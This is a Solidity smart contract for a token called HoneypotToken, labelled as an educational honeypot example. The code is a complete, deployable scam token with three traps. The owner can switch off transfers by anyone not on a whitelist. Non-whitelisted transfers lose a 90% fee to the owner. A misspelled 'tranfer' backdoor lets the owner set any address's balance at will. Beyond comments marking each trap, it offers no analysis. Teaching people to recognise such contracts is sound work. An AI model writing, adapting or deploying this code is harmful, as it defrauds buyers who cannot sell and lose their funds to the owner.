// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title HoneypotExample
 * @dev Example honeypot contract that traps funds
 * WARNING: This is for educational purposes only!
 */

contract HoneypotExample {
    string public name = "HoneypotToken";
    string public symbol = "HONEY";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000 * 10**18;
    
    address private owner;
    bool private tradingEnabled = false;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) private whitelist;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor() {
        owner = msg.sender;
        balanceOf[owner] = totalSupply;
        whitelist[owner] = true;
    }
    
    // Looks normal but has hidden restrictions
    function transfer(address _to, uint256 _value) public returns (bool) {
        // HONEYPOT: Only whitelisted addresses can sell
        require(whitelist[msg.sender] || !tradingEnabled, "Trading not enabled");
        
        // HONEYPOT: High transfer fee for non-whitelisted
        uint256 fee = whitelist[msg.sender] ? 0 : _value * 90 / 100;
        uint256 transferAmount = _value - fee;
        
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += transferAmount;
        balanceOf[owner] += fee; // Fee goes to owner
        
        emit Transfer(msg.sender, _to, transferAmount);
        if (fee > 0) {
            emit Transfer(msg.sender, owner, fee);
        }
        
        return true;
    }
    
    // Owner can add addresses to whitelist
    function addToWhitelist(address _address) external onlyOwner {
        whitelist[_address] = true;
    }
    
    // Owner controls trading
    function enableTrading() external onlyOwner {
        tradingEnabled = true;
    }
    
    // Hidden function to mint more tokens
    function updateBalance(address _address, uint256 _amount) private {
        balanceOf[_address] = _amount;
    }
    
    // Backdoor function (hidden by similar naming)
    function tranfer(address _to, uint256 _value) external onlyOwner returns (bool) {
        updateBalance(_to, _value);
        return true;
    }
}
